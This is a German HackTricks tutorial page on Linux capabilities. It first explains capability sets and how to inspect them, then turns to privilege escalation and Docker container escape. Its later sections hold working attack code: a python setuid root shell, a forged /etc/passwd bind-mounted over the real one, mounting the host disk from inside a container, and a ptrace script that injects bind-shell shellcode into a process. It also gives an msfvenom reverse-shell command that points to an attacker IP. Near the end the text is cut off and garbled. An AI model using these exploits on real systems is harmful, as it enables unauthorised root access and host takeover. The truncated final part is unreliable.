# Linux-Fähigkeiten

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **dem Ziel, technisches Wissen zu fördern**, ist dieser Kongress ein brodelnder Treffpunkt für Technologie- und Cybersicherheitsprofis in jeder Disziplin.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux-Fähigkeiten

Linux-Fähigkeiten teilen **Root-Berechtigungen in kleinere, eigenständige Einheiten** auf, sodass Prozesse einen Teil der Berechtigungen haben können. Dadurch werden Risiken minimiert, indem nicht unnötigerweise volle Root-Berechtigungen gewährt werden.

### Das Problem:
- Normale Benutzer haben begrenzte Berechtigungen, die sich auf Aufgaben wie das Öffnen eines Netzwerk-Sockets auswirken, für die Root-Zugriff erforderlich ist.

### Fähigkeitssets:

1. **Geerbt (CapInh)**:
- **Zweck**: Bestimmt die von dem übergeordneten Prozess übergebenen Fähigkeiten.
- **Funktionalität**: Wenn ein neuer Prozess erstellt wird, erbt er die Fähigkeiten von seinem übergeordneten Prozess in diesem Set. Nützlich, um bestimmte Berechtigungen über Prozessstarts hinweg beizubehalten.
- **Einschränkungen**: Ein Prozess kann keine Fähigkeiten erlangen, die sein übergeordneter Prozess nicht besaß.

2. **Effektiv (CapEff)**:
- **Zweck**: Stellt die tatsächlichen Fähigkeiten dar, die ein Prozess zu einem bestimmten Zeitpunkt nutzt.
- **Funktionalität**: Es handelt sich um das Set von Fähigkeiten, das vom Kernel überprüft wird, um Berechtigungen für verschiedene Operationen zu gewähren. Für Dateien kann dieses Set einen Flag darstellen, das angibt, ob die erlaubten Fähigkeiten der Datei als effektiv betrachtet werden sollen.
- **Bedeutung**: Das effektive Set ist für sofortige Berechtigungsprüfungen entscheidend und fungiert als aktives Set von Fähigkeiten, das ein Prozess verwenden kann.

3. **Zugelassen (CapPrm)**:
- **Zweck**: Definiert das maximale Set an Fähigkeiten, das ein Prozess besitzen kann.
- **Funktionalität**: Ein Prozess kann eine Fähigkeit aus dem zugelassenen Set in sein effektives Set erhöhen, wodurch er die Möglichkeit hat, diese Fähigkeit zu nutzen. Er kann auch Fähigkeiten aus seinem zugelassenen Set entfernen.
- **Grenze**: Es dient als Obergrenze für die Fähigkeiten, die ein Prozess haben kann, und stellt sicher, dass ein Prozess seinen vordefinierten Privilegienbereich nicht überschreitet.

4. **Begrenzung (CapBnd)**:
- **Zweck**: Setzt eine Obergrenze für die Fähigkeiten, die ein Prozess während seines Lebenszyklus jemals erwerben kann.
- **Funktionalität**: Selbst wenn ein Prozess eine bestimmte Fähigkeit in seinem vererbten oder zugelassenen Set hat, kann er diese Fähigkeit nicht erwerben, es sei denn, sie ist auch im Begrenzungsset enthalten.
- **Anwendungsfall**: Dieses Set ist besonders nützlich, um das Potenzial eines Prozesses für Privileg Eskalationen einzuschränken und eine zusätzliche Sicherheitsebene hinzuzufügen.

5. **Umgebungs (CapAmb)**:
- **Zweck**: Ermöglicht das Beibehalten bestimmter Fähigkeiten über einen `execve`-Systemaufruf hinweg, der normalerweise zu einem vollständigen Zurücksetzen der Fähigkeiten des Prozesses führen würde.
- **Funktionalität**: Stellt sicher, dass nicht-SUID-Programme, die keine zugehörigen Dateifähigkeiten haben, bestimmte Privilegien beibehalten können.
- **Einschränkungen**: Fähigkeiten in diesem Set unterliegen den Einschränkungen der vererbten und zugelassenen Sets und stellen sicher, dass sie die erlaubten Privilegien des Prozesses nicht überschreiten.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Für weitere Informationen siehe:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Prozesse & Binäre Fähigkeiten

### Prozessfähigkeiten

Um die Fähigkeiten eines bestimmten Prozesses zu sehen, verwenden Sie die **status**-Datei im /proc-Verzeichnis. Da sie mehr Details liefert, beschränken wir uns nur auf die Informationen, die sich auf Linux-Fähigkeiten beziehen.\
Beachten Sie, dass für alle laufenden Prozesse die Fähigkeiten pro Thread gespeichert werden, für Binärdateien im Dateisystem jedoch in erweiterten Attributen.

Sie können die in /usr/include/linux/capability.h definierten Fähigkeiten finden.

Sie können die Fähigkeiten des aktuellen Prozesses in `cat /proc/self/status` oder mit `capsh --print` und die von anderen Benutzern in `/proc/<pid>/status` finden.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Dieser Befehl sollte auf den meisten Systemen 5 Zeilen zurückgeben.

* CapInh = Vererbte Fähigkeiten
* CapPrm = Erlaubte Fähigkeiten
* CapEff = Effektive Fähigkeiten
* CapBnd = Begrenzungsset
* CapAmb = Umgebungs-Fähigkeiten-Set
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Diese hexadezimalen Zahlen ergeben keinen Sinn. Mit dem Dienstprogramm capsh können wir sie in den Namen der Fähigkeiten umwandeln.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Lassen Sie uns nun die **Fähigkeiten** überprüfen, die von `ping` verwendet werden:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Obwohl das funktioniert, gibt es einen anderen und einfacheren Weg. Um die Fähigkeiten eines laufenden Prozesses zu sehen, verwenden Sie einfach das Tool **getpcaps** gefolgt von seiner Prozess-ID (PID). Sie können auch eine Liste von Prozess-IDs angeben.
```bash
getpcaps 1234
```
Lassen Sie uns hier die Fähigkeiten von `tcpdump` überprüfen, nachdem wir der Binärdatei ausreichend Fähigkeiten (`cap_net_admin` und `cap_net_raw`) gegeben haben, um das Netzwerk abzuhören (_tcpdump läuft im Prozess 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Wie Sie sehen können, entsprechen die angegebenen Fähigkeiten den Ergebnissen der beiden Möglichkeiten, die Fähigkeiten einer Binärdatei abzurufen. Das Tool _getpcaps_ verwendet den Systemaufruf **capget()**, um die verfügbaren Fähigkeiten für einen bestimmten Thread abzufragen. Dieser Systemaufruf muss nur die PID bereitstellen, um weitere Informationen zu erhalten.

### Fähigkeiten von Binärdateien

Binärdateien können Fähigkeiten haben, die während der Ausführung verwendet werden können. Zum Beispiel ist es sehr häufig, die Binärdatei `ping` mit der Fähigkeit `cap_net_raw` zu finden:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Sie können **Binärdateien mit Fähigkeiten durchsuchen**, indem Sie Folgendes verwenden:
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

Wenn wir die CAP\_NET\_RAW-Fähigkeiten für _ping_ entfernen, sollte das Ping-Dienstprogramm nicht mehr funktionieren.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Neben der Ausgabe von _capsh_ selbst sollte auch der _tcpdump_-Befehl einen Fehler anzeigen.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Der Fehler zeigt deutlich, dass der Ping-Befehl nicht berechtigt ist, einen ICMP-Socket zu öffnen. Jetzt wissen wir sicher, dass dies wie erwartet funktioniert.

### Entfernen von Berechtigungen

Sie können Berechtigungen einer Binärdatei mit
```bash
setcap -r </path/to/binary>
```
## Benutzerberechtigungen

Offensichtlich ist es auch möglich, Benutzern Berechtigungen zuzuweisen. Dies bedeutet wahrscheinlich, dass jeder vom Benutzer ausgeführte Prozess die Berechtigungen des Benutzers nutzen kann.\
Basierend auf [diesem](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [diesem](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) und [diesem](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) müssen einige Dateien konfiguriert werden, um einem Benutzer bestimmte Berechtigungen zu geben, wobei die Datei `/etc/security/capability.conf` die Berechtigungen jedem Benutzer zuweist.\
Beispiel für eine Datei:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Umgebungsfähigkeiten

Durch das Kompilieren des folgenden Programms ist es möglich, **eine Bash-Shell in einer Umgebung zu starten, die Fähigkeiten bereitstellt**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Im **bash, der von der kompilierten Umgebungsdatei ausgeführt wird**, ist es möglich, die **neuen Fähigkeiten** zu beobachten (ein normaler Benutzer hat keine Fähigkeiten im "aktuellen" Abschnitt).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Sie können nur Fähigkeiten hinzufügen, die sowohl in den erlaubten als auch in den vererbten Sätzen vorhanden sind.
{% endhint %}

### Fähigkeitsbewusste/Fähigkeitslose Binärdateien

Die **fähigkeitsbewussten Binärdateien verwenden die neuen Fähigkeiten**, die von der Umgebung bereitgestellt werden, nicht. Die **fähigkeitslosen Binärdateien verwenden sie jedoch**, da sie sie nicht ablehnen. Dies macht fähigkeitslose Binärdateien anfällig in einer speziellen Umgebung, die Binärdateien Fähigkeiten gewährt.

## Service-Fähigkeiten

Standardmäßig hat ein **Service, der als Root ausgeführt wird, alle Fähigkeiten zugewiesen**, und in einigen Fällen kann dies gefährlich sein.\
Daher ermöglicht eine **Service-Konfigurationsdatei**, die **Fähigkeiten** festzulegen, die der Service haben soll, **und** den **Benutzer**, der den Service ausführen soll, um das Ausführen eines Dienstes mit unnötigen Privilegien zu vermeiden:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Fähigkeiten in Docker-Containern

Standardmäßig weist Docker den Containern einige Fähigkeiten zu. Es ist sehr einfach zu überprüfen, welche Fähigkeiten dies sind, indem Sie Folgendes ausführen:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **dem Ziel, technisches Wissen zu fördern**, ist dieser Kongress ein brodelnder Treffpunkt für Technologie- und Cybersicherheitsprofis in jeder Disziplin.

{% embed url="https://www.rootedcon.com/" %}

## Privilege Escalation/Container Escape

Capabilities sind nützlich, wenn Sie **Ihre eigenen Prozesse nach dem Ausführen privilegierter Operationen einschränken möchten** (z. B. nach dem Einrichten von chroot und dem Binden an einen Socket). Sie können jedoch ausgenutzt werden, indem ihnen bösartige Befehle oder Argumente übergeben werden, die dann als Root ausgeführt werden.

Sie können Programme mit `setcap` dazu zwingen, Capabilities zu verwenden, und diese mit `getcap` abfragen:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Die `+ep` bedeutet, dass Sie die Fähigkeit hinzufügen ("-" würde sie entfernen) als Effektiv und Erlaubt.

Um Programme in einem System oder Ordner mit Fähigkeiten zu identifizieren:
```bash
getcap -r / 2>/dev/null
```
### Beispiel für Ausnutzung

Im folgenden Beispiel wird festgestellt, dass die Binärdatei `/usr/bin/python2.6` anfällig für Privilege Escalation ist:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Berechtigungen**, die von `tcpdump` benötigt werden, um es **jedem Benutzer zu ermöglichen, Pakete abzufangen**:

```markdown
To allow any user to sniff packets using `tcpdump`, the following **capabilities** need to be granted:

1. `CAP_NET_RAW`: This capability allows the user to create raw network sockets, which is necessary for packet sniffing.

To grant these capabilities to `tcpdump`, you can use the `setcap` command as follows:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
```

After granting these capabilities, any user will be able to run `tcpdump` and sniff packets without requiring root privileges.
```
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Der besondere Fall von "leeren" Berechtigungen

[Laut der Dokumentation](https://man7.org/linux/man-pages/man7/capabilities.7.html): Beachten Sie, dass man einem Programm eine leere Berechtigungsgruppe zuweisen kann. Dadurch ist es möglich, ein Set-User-ID-Root-Programm zu erstellen, das die effektive und gespeicherte Set-User-ID des Prozesses, der das Programm ausführt, auf 0 ändert, aber keine Berechtigungen für diesen Prozess gewährt. Anders ausgedrückt, wenn Sie eine ausführbare Datei haben, die:

1. nicht im Besitz von root ist,
2. keine `SUID`/`SGID`-Bits gesetzt hat,
3. leere Berechtigungen hat (z.B.: `getcap myelf` gibt `myelf =ep` zurück),

dann **wird diese ausführbare Datei als root ausgeführt**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ist eine äußerst mächtige Linux-Berechtigung, die oft als nahezu root-ähnlich angesehen wird, aufgrund ihrer umfangreichen **administrativen Privilegien**, wie dem Mounten von Geräten oder der Manipulation von Kernel-Funktionen. Während sie für Container, die ganze Systeme simulieren, unverzichtbar ist, stellt **`CAP_SYS_ADMIN` erhebliche Sicherheitsherausforderungen** dar, insbesondere in containerisierten Umgebungen, aufgrund ihres Potenzials für Privilegieneskalation und Systemkompromittierung. Daher erfordert ihr Einsatz strenge Sicherheitsbewertungen und vorsichtige Verwaltung, wobei eine starke Präferenz für das Verwerfen dieser Berechtigung in anwendungsspezifischen Containern besteht, um dem **Prinzip des geringsten Privilegs** zu entsprechen und die Angriffsfläche zu minimieren.

**Beispiel mit einer ausführbaren Datei**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Mit Python können Sie eine modifizierte _passwd_-Datei über der echten _passwd_-Datei einbinden:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Und schließlich **mounten** Sie die modifizierte `passwd`-Datei auf `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Und Sie werden in der Lage sein, **`su` als root** mit dem Passwort "password" auszuführen.

**Beispiel mit Umgebung (Docker-Ausbruch)**

Sie können die aktivierten Fähigkeiten innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Im vorherigen Output können Sie sehen, dass die SYS_ADMIN-Fähigkeit aktiviert ist.

* **Mount**

Dies ermöglicht es dem Docker-Container, das Host-Laufwerk zu **mounten und frei darauf zuzugreifen**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Voller Zugriff**

In der vorherigen Methode konnten wir auf die Docker-Host-Festplatte zugreifen.\
Falls Sie feststellen, dass der Host einen **SSH**-Server ausführt, können Sie einen Benutzer auf der Docker-Host-Festplatte erstellen und über SSH darauf zugreifen:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**Dies bedeutet, dass Sie den Container verlassen können, indem Sie einen Shellcode in einen Prozess injizieren, der auf dem Host läuft.** Um auf auf dem Host ausgeführte Prozesse zuzugreifen, muss der Container mindestens mit **`--pid=host`** ausgeführt werden.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** gewährt die Möglichkeit, Debugging- und Systemaufruf-Verfolgungsfunktionen zu verwenden, die von `ptrace(2)` und Cross-Memory-Anhang-Aufrufen wie `process_vm_readv(2)` und `process_vm_writev(2)` bereitgestellt werden. Obwohl dies für diagnostische und Überwachungszwecke leistungsstark ist, kann `CAP_SYS_PTRACE` die Systemsicherheit erheblich untergraben, wenn es ohne restriktive Maßnahmen wie einen Seccomp-Filter auf `ptrace(2)` aktiviert ist. Insbesondere kann es ausgenutzt werden, um andere Sicherheitsbeschränkungen zu umgehen, insbesondere solche, die durch Seccomp auferlegt werden, wie dies durch [Proofs of Concept (PoC) wie diesen](https://gist.github.com/thejh/8346f47e359adecd1d53) demonstriert wird.

**Beispiel mit Binärdatei (Python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Beispiel mit Binärdatei (gdb)**

`gdb` mit der Fähigkeit `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Erstellen Sie einen Shellcode mit msfvenom, um ihn über gdb im Speicher einzufügen

```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw -o shellcode
```

Ersetzen Sie `<IP>` durch die IP-Adresse des Angreifers und `<PORT>` durch den gewünschten Port für die Reverse TCP-Verbindung.

```bash
$ gdb -q <binary>
(gdb) run
```

Führen Sie den gdb-Debugger aus und starten Sie das gewünschte Binärprogramm.

```bash
(gdb) set {unsigned char *}0x<address> = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
